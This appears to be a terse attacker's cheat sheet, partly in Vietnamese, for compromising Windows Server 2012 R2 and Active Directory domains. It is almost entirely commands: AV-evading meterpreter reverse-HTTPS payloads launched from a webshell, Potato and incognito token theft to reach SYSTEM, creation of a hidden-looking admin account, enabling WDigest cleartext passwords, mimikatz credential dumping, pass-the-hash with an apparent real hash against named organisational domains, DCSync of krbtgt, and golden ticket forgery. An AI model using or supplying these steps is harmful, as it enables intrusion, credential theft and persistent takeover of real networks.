1. Local Privilege Escalation in Windows 2012 R2 (No Security Update, No Security Patches)
	B1. Use winpayloads (https://github.com/nccgroup/Winpayloads) for creating meterpreter payload bypass AV (For example, setup_meterpreter_x86_reverse_https_x.x.x.x_443.exe)
	B2. Upload setup_meterpreter_x86_reverse_https_x.x.x.x_443.exe to server
	B3. Get meterpreter session
	In msfconsole:
		use exploit/multi/handler
		set PAYLOAD windows/meterpreter/reverse_https
		set LHOST x.x.x.x
		set LPORT 443
		exploit
	In webshell, run setup_meterpreter_x86_reverse_https_x.x.x.x_443.exe
	B4. Use meterpreter session, upload potato_av.exe to server (This is the payload custom builded from source code for bypassing AV)
	B5. In meterpreter session:
	use incognito
	list_tokens -u
	execute -cH -f ./potato_av.exe 
	execute -cH -f ./potato_av.exe (Sometimes need run two times)
	impersonate_token 'NT AUTHORITY\SYSTEM'
	list_tokens -u
	B6. Done
	Reference: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075

1b. Use incognito
- Upload potato_av va incognito_av len server
- Chay potato_av.exe nhieu lan
- Chay incognito_av
incognito_av.exe list_tokens -u
incognito_av.exe add_user loca1admin 123qwebca@a63811
incognito_av.exe add_localgroup_user administrators loca1admin
incognito_av.exe add_localgroup_user "remote desktop users" loca1admin

2. Enable clear text password on windows server 2012 R2
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1

3. Pass the Hash
- C:\windows\temp\w\m64.exe privilege::debug sekurlsa::logonpasswords exit
- Dump all password
sekurlsa::logonpasswords full
- Dump all keys
sekurlsa::ekeys
- Pass the hash (use ntlm or aes256 key)
sekurlsa::pth /user:exadmin /domain:EVND1.EVN.COM.VN /ntlm:55018a46bd0d2a575bf66aed54226355 /aes256:xxxxxxxx

4. Create golden ticket
- Get NT Hash of krbtgt 
lsadump::dcsync /domain:bank.mb.group /user:bank\krbtgt
- Get SID and FQDN of domain (use output before - drop RID)
  Example: SID of krbtgt = S-1-5-21-2222611480-1876485831-1594900117-502
         => SID of domain = S-1-5-21-2222611480-1876485831-1594900117
- Create golden
kerberos::golden /user:admin /domain:testad.com /sid:S-1-123-22322-1211123 /krbtgt:adad252acdfed /groups:501,502,512,513,518,519,520 /ticket:golden_testad.com.tgt
- Test
drop all kerberos ticket: 
    kerberos::purge 
add golden ticket:   
    kerberos::ptt golden_testad.com.tgt
Open cmd and pwn: 
    net user /domain testadmin 123456a@ /add 